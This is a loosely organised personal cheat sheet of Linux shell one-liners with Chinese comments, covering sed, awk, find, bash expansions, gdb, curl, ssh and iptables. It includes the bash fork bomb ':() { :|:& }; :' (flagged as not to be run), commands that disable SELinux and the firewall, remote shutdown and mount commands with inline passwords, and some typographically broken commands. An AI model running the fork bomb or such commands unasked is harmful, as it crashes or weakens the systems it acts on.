rpm -ivh pgdg-centos93-9.3-1.noarch.rpm

find . -regex '.*\.\(c\|cpp\|h\)$' -print
find . -name '*.c' -o -name '*.cpp' -o -name '*.h'

 sed -i 's/\x80\|\x81\|\x82\|\x83\|\x84\|\x85\|\x86\|\x87\|\x88\|\x89\|\x8A\|\x8B\|\x8C\|\x8D\|\x8E\|\x8F\|\x90\|\x91\|\x92\|\x93\|\x94\|\x95\|\x96\|\x97\|\x98\|\x99\|\x9A\|\x9B\|\x9C\|\x9D\|\x9E\|\x9F\|\xA0\|\xA1\|\xA2\|\xA3\|\xA4\|\xA5\|\xA6\|\xA7\|\xA8\|\xA9\|\xAA\|\xAB\|\xAC\|\xAD\|\xAE\|\xAF\|\xB0\|\xB1\|\xB2\|\xB3\|\xB4\|\xB5\|\xB6\|\xB7\|\xB8\|\xB9\|\xBA\|\xBB\|\xBC\|\xBD\|\xBE\|\xBF\|\xC0\|\xC1\|\xC2\|\xC3\|\xC4\|\xC5\|\xC6\|\xC7\|\xC8\|\xC9\|\xCA\|\xCB\|\xCC\|\xCD\|\xCE\|\xCF\|\xD0\|\xD1\|\xD2\|\xD3\|\xD4\|\xD5\|\xD6\|\xD7\|\xD8\|\xD9\|\xDA\|\xDB\|\xDC\|\xDD\|\xDE\|\xDF\|\xE0\|\xE1\|\xE2\|\xE3\|\xE4\|\xE5\|\xE6\|\xE7\|\xE8\|\xE9\|\xEA\|\xEB\|\xEC\|\xED\|\xEE\|\xEF\|\xF0\|\xF1\|\xF2\|\xF3\|\xF4\|\xF5\|\xF6\|\xF7\|\xF8\|\xF9\|\xFA\|\xFB\|\xFC\|\xFD\|\xFE\|\xFF//g' 
            `find -regex '.*\.\(c\|cpp\|h\)$'`
            
for plugin in $@
do
    echo "start"
    echo $plugin
    echo "tcpdump..."
    /log/.debug/tcpdump -n -s0  host 10.101.0.254 and 10.101.0.201 -w /log/plugin_test/10.101.0.254_$plugin.pcap &
    echo "test..."
    i=0
    while [ "$i" -le 5 ]
    do
    	i=$((i + 1))
    done
    echo "kill tcpdump..."
    kill `pidof tcpdump`
    echo "end"
done


tmpfile=`mktemp myshell.XXXXXXXXXXXX` || exit 1
trap 'rm -f $tmpfile' EXIT


echo "start tcpdump..."
cd /log/test/ ||  mkdir -p /log/test/ && \
/log/.debug/tcpdump -n -s0  host 10.101.0.254 -w /log/test/10.101.0.254.pcap &
echo "test..."
i=0
while [ "$i" -le 50 ]
do
    curl 10.101.0.254/ssss$i
    i=$((i + 1))
done
echo "kill tcpdump..."
kill `pidof tcpdump`
echo "end"


v0="abc1234zip1234abc"
v1=${v0/#abc/ABCDEF}
v2=${v0/%abc/ABCDEF}
echo $v0
    abc1234zip1234abc
echo $v1
    ABCDEF1234zip1234abc
echo $v2
    abc1234zip1234ABCDEF
    



date  +"%F %T %z (%a, %e %b %G)"


    

iconv -f cp936 -t utf8 Makefile >Makefile.utf8
iconv -f GB18030 -t utf-8 xxx >yyy
iconv -f utf8 -t big5 vi.big5.utf8 | iconv -f big5 -t gb2312 | iconv -f gb2312 -t utf8 -o vi.big_utf8.gb_utf8
big5<->gb2312

sed -e ‘s/^M/\n/g’ myfile.txt
注意：这里的“^M”要使用“CTRL-V CTRL-M”生成，而不是直接键入“^M”



负整数 ^-[1-9]/d*$ 
非正整数(负整数 + 0) ^(0?|-0|-[1-9]/d*)$ 
非负整数(自然数 + 0) ^(0?|[1-9]/d*)$ 
正整数(自然数) ^[1-9]/d*$ 
整数 ^(0?|-0|-?[1-9]/d*)$ 
负浮点数 ^-(0(/./d*[1-9]+/d*)|[1-9]+/d*(/./d+)?)$ 
非正浮点数(负浮点数 + 0) ^(-0(/./d+)?|0(/.0+)?|(-[1-9]+/d*)(/./d+)?)$ 
非负浮点数（正浮点数 + 0） ^(0|[1-9]+)(/./d+)?$ 
正浮点数 ^(0/./d*[1-9]+/d*|([1-9]+(/./d+)?))$ 
浮点数 ^-?(0(/./d+)?|[1-9]+/d*(/./d+)?)$ 


mv /etc/lynx.cfg{~,}
echo {a,b,c}{a,b,c}{a,b,c}

ls bbb.txt | sed 's/\.txt$//g' | xargs -Iname mv name.txt name.xml 


ls -i /path/to/file
find / -inum <file-inode>;



sed /^[[:space:]]*$/d filename


basename - strip directory and suffix from filenames
dirname  - strip non-directory suffix from file name


sed ':a;N;$!ba;s/\n/ /g'
This will read the whole file in a loop, then replaces the newline(s) with a space.
1. create a label via :a
2. append the current and next line to the pattern space via N
3. if we are before the last line, branch to the created label $!ba ($! means not to do it on the last line (as there should be one final newline)).
4. finally the substitution replaces every newline with a space on the pattern space (which is the whole file).
 
 | tr '\n' ',' | sed 's/,*$//g'
 
 sqlite3 ../test.db "select count(*) from tmp;"
 
/sbin/sysctl -p
vim /etc/sysctl.conf


${var%%Pattern} Remove from $var the longest part of $Pattern that matches the back end of $var.
${string%%substring}
Deletes longest match of $substring from back of $string.
1 stringZ=abcABC123ABCabc
2 # || shortest
3 # |------------| longest
4
5 echo ${stringZ%b*c} # abcABC123ABCa
6 # Strip out shortest match between 'b' and 'c', from back of $stringZ.
7
8 echo ${stringZ%%b*c} # a
9 # Strip out longest match between 'b' and 'c', from back of $stringZ.

 bind -p 快捷键查找
 
command &>/dev/null &

man command |col -b >text.txt
info sed --subnodes -o sed.info 

: > filename
> filename 同上，有些shell不支持


字符 英文名称 Unix绰号 章号 作用 
& ampersand（和号） -- 26 作业控制：在后台运行命令 
' apostrophe（撇号） 引号、单引号 12 引用：取消所有的替换 
* asterisk（星号） 星号 24 文件名扩展：匹配0个或多个字符 
@ at sign（at符号） at     
` back quote（反引号） 反引号（backtick） 13 命令行：命令替换 
\ backslash（反斜线） -- 12 引用：下一个字符转义 
{} bracebrackets（花括号） 花括号，波型括号 12 变量：确定变量名称的界限 
{} bracebrackets（花括号） 花括号，波型括号 24 花括号扩展：生成一种字符模式 
^ circumflex（音调符号） 插入记号     
: colon（冒号） --     
, comma（逗号） --     
$ dollar sign（美元符号） 美元 12 变量：用变量的值替换 
<Return> enter、return（回车） 新行 7 空白符：标记一行结束 
= equal sign（等号） 等号     
! exclamation mark（感叹号） bang 13 历史列表：事件标记 
> greater-than sign（大于号） 大于 15 命令行：重定向输出 
- hyphen（连字符）、minus sign（减号） 虚线、减号     
< less-than sign（小于号） 小于 15 命令行：重定向输入 
# number sign（序数符号） hash、pound 14 命令行：注释的开头，忽略该行其余部分 
() parentheses（圆括号） -- 15 命令行：在子shell中运行命令 
% percent sign（百分比符号） 百分比     
. period（点号） 点     
+ plus sign（加号） 加     
? question mark（问号） -- 24 文件名扩展：匹配任意一个字符 
" quotation mark（引号） 双引号 12 引用：取消大部分替换 
; semicolon（分号） -- 10 命令行：用于分割多条命令 
/ slash（斜线） 正斜线     
<Space> space（空格） -- 10 空白符：在命令行中分割单词 
[] square brackets（方括号） 方括号 24 文件名扩展：与一组字符中的字符匹配 
<Tab> tab（制表符） -- 10 空白符：在命令行中分割单词 
~ tilde（波浪号） -- 24 文件名扩展：插入home目录的名称 
_ underscore（下划线） --     
| vertical bar（竖线） 管道 15 命令行：创建一个管道线 

$*
#将所有命令行参数视为单个字符串。
 等同于"$1 $2 ..."。
 $IFS的第一个字符用来作为分隔字符，以分隔不同的值来建立字符串。
printf "The arguments were %s\n" "$*"

$@
#将所有命令行参数视为单独的个体，也就是单独字符串。
 等同于"$1" "$2" ...



FS = "[ \t\n]+"
awk '$3==0 && $6=="LISTEN" || NR==1 {printf "%-20s %-20s %s\n",$4,$5,$6}' netstat.txt
$0 当前记录（这个变量中存放着整个行的内容） 
$1~$n 当前记录的第n个字段，字段间由FS分隔 
FS 输入字段分隔符 默认是空格或Tab 
NF 当前记录中的字段个数，就是有多少列 
NR 已经读出的记录数，就是行号，从1开始，如果有多个文件话，这个值也是不断累加中。 
FNR 当前记录数，与NR不同的是，这个值会是各个文件自己的行号 
RS 输入的记录分隔符， 默认为换行符 
OFS 输出字段分隔符， 默认也是空格 
ORS 输出的记录分隔符，默认为换行符 
FILENAME 当前输入文件的名字 





 awk '$3==0 && $6=="ESTABLISHED" || NR==1 {printf "%02s %s %-20s %-20s %s\n",NR, FNR, $4,$5,$6}' netstat.txt 
 
 awk '$6 ~ /FIN/ || NR==1 {print NR,$4,$5,$6}' OFS="\t" netstat.txt 正则
 
 awk '/LISTEN/' netstat.txt 像grep
 awk '$6 ~ /FIN|TIME/ || NR==1 {print NR,$4,$5,$6}' OFS="\t" netstat.txt 
 
 awk 'NR!=1{print > $6}' netstat.txt 按第6例分隔文件
 awk 'NR!=1{print $4,$5 > $6}' netstat.txt 

awk 'NR!=1{if($6 ~ /TIME|ESTABLISHED/) print > "1.txt"; else if($6 ~ /LISTEN/) print > "2.txt"; else print > "3.txt" }' netstat.txt 

ls -l  *.cpp *.c *.h | awk '{sum+=$5} END {print sum}'

awk 'NR!=1{a[$6]++;} END {for (i in a) print i ", " a[i];}' netstat.txt 

ps aux | awk 'NR!=1{a[$1]+=$6;} END { for(i in a) print i ", " a[i]"KB";}'

BEGIN{ 这里面放的是执行前的语句 } 
END {这里面放的是处理完所有的行后要执行的语句 } 
{这里面放的是处理每一行时要执行的语句} 


$ cat cal.awk
#!/bin/awk -f 
#运行前 
BEGIN {
     math = 0     
     english = 0     
     computer = 0       
     
     printf "NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n"    
     printf "---------------------------------------------\n"
} 
#运行中 
{
     math+=$3
     english+=$4     
     computer+=$5     
     printf "%-6s %-6s %4d %8d %8d %8d\n", $1, $2, $3,$4,$5, $3+$4+$5 
} 
#运行后 
END 
{
     printf "---------------------------------------------\n"    
     printf "  TOTAL:%10d %8d %8d \n", math, english, computer     
     printf "AVERAGE:%10.2f %8.2f %8.2f\n", math/NR, english/NR, computer/NR
}


#从file文件中找出长度大于80的行 
awk 'length>80' file



[chengmo@centos5 ~]$ time echo {1..100}                                                                                                                                                                                                                                                             
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 
                                                                                                                                                                                                                                                                                                    
real    0m0.000s                                                                                                                                                                                                                                                                                    
user    0m0.001s                                                                                                                                                                                                                                                                                    
sys     0m0.000s                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                    
[chengmo@centos5 ~]$ time echo $(seq 100)                                                                                                                                                                                                                                                           
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 
                                                                                                                                                                                                                                                                                                    
real    0m0.003s                                                                                                                                                                                                                                                                                    
user    0m0.002s                                                                                                                                                                                                                                                                                    
sys     0m0.001s                     

a b c d e f g h i j k l m n o p q r s t u v w x y z

 echo {a..z},{A..Z}
 echo {a..z}{A..Z}
 echo {a..z} {A..Z}
 
 for char in {0..9} {a..z} {A..Z}; do echo -n "$char:  "; grep -o $char zzzz |wc -l; done | sort -n -k2
 
 
 
 
The following example is a convenient way of copying directory hierarchy from ‘sourcedir’ to ‘targetdir’. 
  $ (cd sourcedir; tar -cf - .) | (cd targetdir; tar -xpf -) 
The ‘-C’ option allows to avoid using subshells: 
  $ tar -C sourcedir -cf - . | tar -C targetdir -xpf -
 
In both examples above, 
the leftmost tar invocation archives the contents of ‘sourcedir’ to the standard output, 
while the rightmost one reads this archive from its standard input and extracts it. 
The ‘-p’ option tells it to restore permissions of the extracted files. 



I can do “OR” with ‘|’, but what about “AND”? 
          grep 'paul' /etc/motd | grep 'franc,ois'
finds all lines that contain both ‘paul’ and ‘franc,ois’

!$是一个特殊的环境变量，它代表了上一个命令的最后一个字符串。

!xxx来重复最近的一次命令
     !vi 重得上次最近一次的vi命令

热建alt+. 或 esc+. 可以把上次命令行的参数给重复出来。

!!:gs/old/new 替换前一条命令里的部分字符串。
^old^new      替换前一条命令里的部分字符串

du -s * | sort -n | tail  列出当前目录里最大的10个文件。

date -d@1234567890   时间截 转 时间
date +%s -d "2013-08-01 12:45:19"

mtr coolshell.cn   mtr命令比traceroute要好。

echo “ls -l” | at midnight    在某个时间运行某个命令。


在命令行前加空格，该命令不会进入history里。 


echo test >> $(date -d "today" +"%Y%m%d_%H%M%S").txt



curl -u user:pass -d status=”Tweeting from the shell” http://twitter.com/statuses/update.xml
命令行的方式更新twitter。


curl -u username –silent “https://mail.google.com/mail/feed/atom” | perl -ne ‘print “\t” if /<name>/; print “$2\n” if /<(title|name)>(.*)<\/\1>/;’
检查你的gmail未读邮件

curl icanhazip.com
curl ifconfig.me
当你的机器在内网的时候，可以通过这个命令查看外网的IP。


ps aux | sort -nk +4 | tail
列出头十个最耗内存的进程

tail -f /path/to/file.log | sed '/^Finished: SUCCESS$/ q'
当file.log里出现Finished: SUCCESS时候就退出tail，这个命令用于实时监控并过滤log是否出现了某条记录。


ssh user@server bash < /path/to/local/script.sh
在远程机器上运行一段脚本。这条命令最大的好处就是不用把脚本拷到远程机器上。

ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
比较一个远程文件和一个本地文件 

net rpc shutdown -I ipAddressOfWindowsPC -U username%password
远程关闭一台Windows的机器


screen -d -m -S some_name ping my_router
后台运行一段不终止的程序，并可以随时查看它的状态。-d -m参数启动“分离”模式，-S指定了一个session的标识。可以通过-R命令来重新“挂载”一个标识的session。更多细节请参考screen用法 man screen。 

wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
下载整个www.example.com网站。（注：别太过分，大部分网站都有防爬功能了：）） 
wget -r -np http://git-scm.com/book/
wget -r -A ".c,.h" http://beej.us/




convert input.png -gravity NorthWest -background transparent -extent 720×200  output.png
改一下图片的大小尺寸 

lsof –i
实时查看本机网络服务的活动状态。

vim scp://username@host//path/to/somefile
vim一个远程文件


python -m SimpleHTTPServer
一句话实现一个HTTP服务，把当前目录设为HTTP服务目录，可以通过http://localhost:8000访问 这也许是这个星球上最简单的HTTP服务器的实现了。
python -m SimpleHTTPServer 8080
python -c "help('modules')"


history | awk '{CMD[$2]++;count++;} END { for (a in CMD )print CMD[a] " " CMD[a]/count*100 "% " a }' | grep -v "./" | column -c3 -s " " -t | sort -nr | nl | head -n10
(陈皓注：有点复杂了，history|awk ‘{print $2}’|awk ‘BEGIN {FS=”|”} {print $1}’|sort|uniq -c|sort -rn|head -10)
这行脚本能输出你最常用的十条命令，由此甚至可以洞察你是一个什么类型的程序员。


# time for((i=0;i<=100000;i++)); do ((sum+=i)); done ; echo $sum
real    0m1.134s
user    0m1.080s
sys     0m0.048s

5000050000

# time awk 'BEGIN{while(i++<100000)sum+=i; printf "%d", sum;}'  
5000050000
real    0m0.029s
user    0m0.020s
sys     0m0.000s


# time awk -F'[ /]' '{print $5}' a.txt  >/dev/null
real    0m17.717s
user    0m14.749s
sys     0m2.844s

# time awk '{print $4}' a.txt |awk -F/ '{print $2}' >/dev/null
real    0m0.565s
user    0m0.224s
sys     0m0.688s 



sed -n '45,50p' filename 
sed -n '51q;45,50p' filename  更优，当文件读取到第51行时即时退出。避免文件后续部分的遍历，在大数据量处理上能够很大的提高执行效率。

sed 's/foo/bar/g' filename
sed '/foo/ s/foo/bar/g' filename  增加一个判断逻辑，采用“事先匹配”代替“直接替换”，保留前一次的正则匹配环境，不会产生冗余的正则匹配，因此方法2具有比方法1更高的效率

sed -e '/123/ c\solongg\nso long' a.txt
将匹配到123的行修改成两行
sed -e '/123/ i\solongg\nso long' a.txt
将匹配到123的行前加两行
sed -e '/123/ a\solongg\nso long' a.txt
将匹配到123的行后追加两行

sed -n '/^begin/,/end$/p' file |grep -v begin|grep -v end
取begin和end中间的内容


sed  'N;N;N;s/\n/\t/g'  file
每3行合并成一行


合并成一行
echo $(<file)
cat xxxx.log |paste -s -d " "
cat file | xargs echo
tr  '\n' ' ' <xxxx.log
tr  '\n' ' ' <xxxx.log; echo

:() { :|:& }; :      # <--- 這個別亂跑！好奇會死人的！
echo '十人|日一|十十o' | sed 's/.../&\n/g'   # <--- 跟你講就不聽，再跑這個好了...

command <CTRL-x CTRL-e> 用编辑器来敲命令
$EDITOR指定编辑器
vi 模式，<ESC v>

3.用ssh创建端口转发通道
1
 ssh -N -L2001:remotehost:80 user@somemachine 
这个命令在本机打开了2001端口，对本机2001端口的请求通过somemachine作为跳板，转到remotehost的80端口上。

实现效果跟术语反向代理是相似的，实际上就是端口转发，注意上面的描述涉及了3台主机，但当然somemachine可以变成localhost。

这个命令比较抽象，但有时候是很有用的，比如因为众所周知的原因国内的IP的80端口无法使用，又或者公司的防火墙只给外网开了ssh端口，需要访问内部服务器一个web应用，以及需要访问某些限定了来源IP的服务，就可以用上这个方法了。

举一个具体例子，运行：

1
2
 ssh -f -N -L 0.0.0.0:443:twitter.com:443 shell.cjb.net
ssh -f -N -L 0.0.0.0:80:twitter.com:80 shell.cjb.net 
然后在/etc/hosts里面添加127.0.0.1 twitter.com，好吧剩下的你懂的。

当然通常做这个功能的反向代理，应该要用squid、nginx之类，ssh就算是轻量级的尝试吧！

rev - reverse lines of a file


rdate -s time.nist.gov
ntpdate time.nist.gov


find . -type f -exec touch {} \;

find -type f -printf '%T+ %p\n'
find -type f -printf '%T+ %P\n'
find -type f -printf "%T@ %p\n"
find -type f -printf "%T@ %P\n"

find . -type f -printf "%C@ %p\n" | sort -rn | head -n 10
find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r


find . -name '*.[ch]' | xargs grep -l thing
find . -name '*.[ch]' -print0 | xargs -r -0 grep -l thing
-print
            the entire file name on the standard output, followed by a newline. 
-print0
            Because Unix filenames can contain blanks and newlines.
            If there is the faintest possibility that one of the files for which you are searching might contain a newline, you should use ‘-print0’ instead.
-r
--no-run-if-empty
            If the standard input does not contain any nonblanks, do not run the command.
            Normally, the command is run once even if there is no input.  
            This option is a GNU extension.
-0
--null
            Input items are terminated by a null character instead of by whitespace, and the quotes and backslash are not special
            (every character is taken literally).  
            Disables the end of file string, which is treated like any other argument.
            Useful when input items might contain white space, quote marks, or backslashes.
            The GNU find -print0 option produces input suitable for this mode.
     
            This method can be refined a little by using the ‘-r’ option to make xargs not run grep if find produces no output, 
            and using the find action ‘-print0’ and the xargs option ‘-0’ to avoid misinterpreting files whose names contain spaces:
            

find . -wholename './src/emacs' -prune -print -o -print
find . -wholename './src/emacs' -prune , -print
    skip the directory src/emacs and all files and directories under it, and print the names of the other files found
    
LNX=/home/jru/linux-2.4.18
cd /    
find  $LNX                                                                \
    -path "$LNX/arch/*" ! -path "$LNX/arch/i386*" -prune -o               \
    -path "$LNX/include/asm-*" ! -path "$LNX/include/asm-i386*" -prune -o \
    -path "$LNX/tmp*" -prune -o                                           \
    -path "$LNX/Documentation*" -prune -o                                 \
    -path "$LNX/scripts*" -prune -o                                       \
    -path "$LNX/drivers*" -prune -o                                       \
    -name "*.[chxsS]" -print >/home/jru/cscope/cscope.files

   
(  (-path "$LNX/arch/*") -a (! -path "$LNX/arch/i386*")  )    -prune -o               \

ls -dils
    204744   17 -rw-r--r--   1 djm      staff       17337 Nov  2  1992 ./lwall-quotes
    
-d,--directory                                                                                
        list directory entries instead of contents, and do not dereference symbolic links
-i, --inode                                               
        with -l, print the index number of each file
-s, --size                                        
        with -l, print size of each file, in blocks
        
        The fields are:
        1. The inode number of the file. 
            See Hard Links, for how to find files based on their inode number.
        2. The number of blocks in the file. 
            The block counts are of 1K blocks, unless the environment variable POSIXLY_CORRECT is set, in which case 512-byte blocks are used. 
            See Size, for how to find files based on their size.
        3. The file's type and file mode bits. 
            The type is shown as a dash for a regular file; 
            for other file types, a letter like for ‘-type’ is used (see Type). 
            The file mode bits are read, write, and execute/search for the file's owner, its group, and other users, respectively; 
            a dash means the permission is not granted. 
            See File Permissions, for more details about file permissions. 
            See Mode Bits, for how to find files based on their file mode bits.
        4. The number of hard links to the file.
        5. The user who owns the file.
        6. The file's group.
        7. The file's size in bytes.
        8. The date the file was last modified.
        9. The file's name. 
            ‘-ls’ quotes non-printable characters in the file names using C-like backslash escapes. 
            This may change soon, as the treatment of unprintable characters is harmonised for ‘-ls’, ‘-fls’, ‘-print’, ‘-fprint’, ‘-printf’ and ‘-fprintf’.


find / -name xyzzy -print0 > list; xargs --null --arg-file=list munge
xargs --null --arg-file=<(find / -name xyzzy -print0) munge

find bills -type f | xargs -I XX sort -o XX.sorted XX
find bills -type f -execdir sort -o '{}.sorted' '{}' ';'


find . -name '.#*' -print0 | xargs -0r rm -f
find . -depth -name '.#*' -delete


find . -maxdepth 1 -inum 12345 -okdir rm -f '{}' \;
 
rpm -qa | grep yum | xargs rpm -e --nodeps
rpm -qpl oracle-instantclient11.2-basic-11.2.0.3.0-1.i386.rpm |xargs du -ahc
rpm -ql ruby

readelf -d filename.so  查看共享库的以来库 和搜索名字

readelf -h filename.so 显示elf头信息


ldconfig -v|grep libz 查看lib
ld --verbose | grep SEARCH


echo "(6+3)*2" |bc
echo $((3+5))
echo $(($a+$b))
echo $a+$b |bc
expr 6 + 3 有空格
expr $a+5  无空格
awk 'BEGIN{a=(3+2)*2;print a}'


//计算前天的日期
echo `date +%Y%m%d`-2 |bc

//字串长度 
# expr length "yangzhigang.cublog.cn" 

//从位置处抓取字串 
# expr substr "yangzhigang.cublog.cn" 1 11

//字串开始处
# expr index "yangzhigang.cublog.cn" cu

!ls:p 仅打印输出，而不执行

!$ 上一条命令的最后一个参数，与 Alt + . 相同

!* 上一条命令的所有参数

!*:p：打印输出 !* 的内容

^blah           删除上一条命令中的 blah
^blah^foo       将上一条命令中的 blah 替换为 foo
^blah^foo^      将上一条命令中所有的 blah 都替换为 foo






awk 'BEGIN { cmd="cp -irv /usr/lib/python2.6/site-packages /usr/lib/python2.7/"; print "n" |cmd; }' 这个不行同echo "n" | cp -i *.desc xxx/ 这个只能一个
echo  | cp -i *.desc xxx/ 也可以



${varible##*string }   贪婪模式，  从左向右截取 最后一个 string后的字符串，string后面的字符串
${varible#*string}     非贪婪模式，从左向右截取   第一个 string后的字符串，string后面的字符串
${varible%%string*}  贪婪模式，　从右向左截取   最后一个 string后的字符串，string前面的字符串
${varible%string*}   非贪婪模式，从右向左截取     第一个 string后的字符串，string前面的字符串
filename=$(basename "$fullfile")
filename="${fullfile##*/}"
extension="${filename##*.}"
filename="${filename%.*}"



echo $str | cut -d "-" -f 1

echo "aaa|bbb|ccc|ddd" | cut -d "|" --output-delimiter=" " -f 2-4


sed -n ‘/^begin/,/end$/p’ file |grep -v begin|grep -v end

for number in `echo $NUMBERS` # for number in 9 7 3 8 37.53


 ()和{}都是对一串的命令进行执行，但有所区别：
    A、()只是对一串命令重新开一个子shell进行执行
    B、{}对一串命令在当前shell执行
    
    C、()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开
    
    D、()最后一个命令可以不用分号
    E、{}最后一个命令要用分号
    
    F、{}的第一个命令和左括号之间必须要有一个空格
    G、()里的各命令不必和括号有空格
    
    H、()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令

 
addr="192.168.0.111"
echo "'$addr'" 结果为 '192.168.0.111'
echo '"$addr"' 结果为 "$addr"
这两个我还可以理解：
1) 双引号内的单引号功能被关闭，反之亦然。
2) 双引号内的$功能被保留，单引号内的$功能被关闭。
echo '"'$addr'"' 结果是 "192.168.0.111"
echo '"'$addr'"'="$addr" =addr的值
echo "'"$addr"'" 结果是 '192.168.0.111'
系统没那么聪明  他看到前面2个单引号就以为是一对了 他哪知道第一个和第4个才是一对



strip经常用来去除目标文件中的一些符号表、调试符号表信息，以减小程序的大小，在rpmbuild包的最后就用到。

export HOSTIP=`echo $SSH_CONNECTION|awk '{print $3}'` 

PROMPT_COMMAND='echo -ne "\\033]0;$USER@$HOSTIP $PWD \\007"
echo -ne "\033]0;${1}\007"
    ESC ] Ps ND string NP
    \033 => <ESC>
    0 => Ps = 0 (use string as a new icon name and title)
    ; => non-digit character
    string => "myWindowTitle"
    \007 => <BEL> (non-printing character)

    ND can be any non-digit Character (it's discarded)
    NP can be any non-printing Character (it's discarded)
    string can be any ASCII printable string (max 511 characters)
    Ps = 0 -> use string as a new icon name and title
    Ps = 1 -> use string is a new icon name only
    Ps = 2 -> use string is a new title only
    Ps = 46 -> use string as a new log file name
ESC]0;stringBEL -- Set icon name and window title to string
ESC]1;stringBEL -- Set icon name to string
ESC]2;stringBEL -- Set window title to string



export PS1="[\u@\h [\$(date+%k:%m:%S)]] "
export PROMPT_COMMAND="date +%k:%m:%S"
export PROMPT_COMMAND="echo -n [$(date +%k:%m:%S)]"
PROMPT_COMMAND="echo -ne '\e[0;31m[$(date +%k:%m:%S)]\e[m'"
PROMPT_COMMAND='echo -ne "\e[0;31m[$(date +%k:%m:%S)]\e[m"'
PROMPT_COMMAND='echo -ne "\e[5;31m[$(date +%k:%m:%S)]\e[m"'
echo -ne "\033]2;${1}\007"

strace 命令是一种强大的工具，它能够显示所有由用户空间程序发出的系统调用。 
nm - list symbols from object files
ldd - print shared library dependencies


sed -n '/<word>/ s/.*<word>\(.*\)<\/word>.*/\1/gp' word.xml
grep '<word>' word.xml | sed 's/.*<word>\(.*\)<\/word>.*/\1/g'  更快


echo 1268727836 | awk '{print strftime("%c",$1)}'

mogrify  -  resize  an  image, blur, crop, despeckle, dither, draw on, flip, join, re-sample, and much more.

PROMPT_COMMAND='echo -ne "\e[0;31m[$(./home/code/shell/word_prompt.sh)]\e[m"'

echo -e "\033[background_number;foreground_numberm"

echo $LINENO
显示当前行号


gcc
	gcc -DYES -UYES -o helloyesno hello.c
	gcc -g -o testwmi -I. -L.  -lwmiclient testwmi.c

    编译目标代码时指定可执行文件的动态库搜索路径
    gcc -o pos main.c -L. -lpos -Wl,-rpath,./



gdb
gdb -x foo.gdbinit foo
	dir xxx/xxx/xxx

	set substitute-path /home/new_scanner/trunk/user/modules/hse /log/.debug/hse

	display/<fmt> <xxx>  自动显示
		undisplay <dnums...>
		disable display <dnums...>
		enable display <dnums...>
		info display


	x/8sb 0x15616b04 显示内存地址内容8是8个 s是字符串 b是字节
	p *a @3 显示数组a前3个元素

	set follow-fork-mode 

    break ... if <condition> 
        break if i=100

    info threads 显示当前可调试的所有线程
    thread ID 切换当前调试的线程为指定ID的线程
    break thread_test.c:123 thread all 在所有线程中相应的行上设置断点
    set scheduler-locking off|on|step 
        off 不锁定任何线程，也就是所有线程都执行，这是默认值
        on 只有当前被调试程序会执行
        step 在单步的时候，除了next过一个函数的情况以外，只有当前线程会执行。
    break <linespec> thread <threadno> [if ...]
        break frik.c:13 thread 28 if bartab > lim


if (( RANDOM % 2 )); then C1; else C2; fi
C$((RANDOM%2+1))
(( RANDOM%2 == 0 )) && C1 || C2

echo $((RANDOM%2+1))
echo $[RANDOM%X+1]
Random Number Between 1 And X, RANDOM 0~32767

Generate a random 8 character password containing a-z, A-Z and 0-9: 
egrep -ioam1 '[a-z0-9]{8}' /dev/urandom

tr -c “[:digit:]” ” ” < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=”1;32″ grep –color “[^ ]“
想看看Marix的屏幕效果吗？（不是很像，但也很Cool!）


rsync -a -delete empty/ s1/
rsync -delete 将目标文件夹以一个空文件夹来替换,来删除一个目录下的海量文件最快的方法

mkdir empty_dir
rsync -a --delete empty_dir/    yourdirectory/

dd if=/dev/zero of=xxx bs=1K count=1000 生成大文件

ssh-agent bash && ssh-add

expr length 'hello world!'
str="hello world!"
echo ${#str}

ls -i
find ./ -inum 398459501 -print -exec rm -rf {} \;

/usr/sbin/setenforce 0 立刻关闭 SELINUX
/usr/sbin/setenforce 1 立刻启用 SELINUX

使时区的更改立刻生效
cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
最好使用下面的命令将更改写入bios
hwclock -w

ctags --list-kinds=c
ctags -R --c-kinds=+px && cscope -Rbq

/etc/init.d/iptables stop
iptables -Lv --line-numbers
iptables -I INPUT -p udp --dport 123 -j ACCEPT
/etc/rc.d/init.d/iptables save
iptables -D INPUT -p udp --dport 123 -j ACCEPT
iptables -D INPUT 4


#!/bin/bash 
#account:password:UID:GID:GECOS:directory:shell
IFS=':'
while read account password UID GID GECOS directory shell
do 
    echo "$account $UID $shell" 
done < /etc/passwd

echo >>/tmp/size hhhhjjjj

fc #edit history command
ctrl-x ctrl-e # in emacs mode
<ESC> v # in vi mode
The shell will take what you have written on the command line thus far and paste it into the editor specified by $EDITOR. 
Then you can edit at leisure using all the powerful macros and commands of vi, emacs, nano, or whatever.

'ALT+.' or '<ESC> .'

dig +short txt <keyword>.wp.dg.cx

!!:gs/foo/bar

rm !(*.foo|*.bar|*.baz)
Deletes all files in a folder that are NOT *.foo, *.bar or *.baz files.
find . ! -name <FILENAME> -delete

awk '!x[$0]++' <file>
Remove duplicate entries in a file without sorting. 

Insert the last command without the last argument (bash)
/usr/sbin/ab2 -f TLS1 -S -n 1000 -c 100 -t 2 http://www.google.com/
!:- http://www.commandlinefu.com/


? () { echo "$*" | bc -l; }
? 10*2+3


mkdir /home/foo/doc/bar && cd $_
mkdir & cd into it as single command 


mount -t cifs -o uid=500,gid=500,username=administrator,password=q //192.168.2.20/C$ /mnt/hgfs/C\:
